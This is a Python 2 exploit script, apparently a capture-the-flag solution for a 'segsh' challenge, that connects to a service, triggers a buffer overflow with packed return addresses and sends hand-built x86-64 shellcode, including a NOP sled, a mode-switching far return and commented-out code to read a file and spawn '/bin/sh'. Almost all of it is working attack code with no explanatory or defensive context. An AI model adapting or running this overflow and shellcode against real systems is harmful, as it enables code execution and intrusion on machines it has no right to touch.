#!/usr/bin/env python
from sc_pwn import *
from base64 import b64decode

target     = {'host':'192.168.75.129','port':8080}
#target     = {'host':'segsh.bostonkey.party','port':8888}

addr_read       = 0x6f
addr_buffer     = 0x10000
str_fleg        = '/bin/sh\x00'

#==========
def attack(cmn):
    cmn.read_until('__')
    cmn.sendln('install -i echo')
    cmn.read_until('__')
    cmn.sendln('exec -e echo')
    cmn.read_until('Input string: ')

    sc = ShellCode('amd64')
    shellcode  = '\x90'*0x500
    #shellcode += '\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb'
    shellcode += '\x6a\x2b'
    shellcode += '\x68\xef\xbe\xad\xde'
    shellcode += '\x6a\x00'
    shellcode += '\x6a\x33'
    shellcode += '\xe8\x00\x00\x00\x00'
    shellcode += '\x83\x04\x24\x05'
    shellcode += '\xcf'
    shellcode += sc.exit()
    """
    shellcode += sc.read(STDIN_FILENO,addr_buffer,len(str_fleg))
    shellcode += sc.syscall(-10166, [addr_buffer, O_RDONLY, 0777])
    shellcode += sc.read(3,addr_buffer,0x500)
    shellcode += sc.rval2arg(3)
    shellcode += sc.write(STDOUT_FILENO,addr_buffer,None)
    shellcode += sc.execve(addr_buffer)
    shellcode += sc.exit()
    """

    exploit  = '\x00'*(0x400-8)
    exploit += pack_32(addr_buffer)
    exploit += pack_32(addr_read)
    exploit += pack_32(0)
    exploit += pack_32(-0x2000)
    exploit += pack_32(0x2000)

    cmn.send(exploit)
    sleep(0.1)
    cmn.send(shellcode)
    #sleep(0.1)
    #cmn.send(str_fleg)
    print cmn.read_all()

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW',disp=False)
    attack(cmn)
    del(cmn)
    
#==========
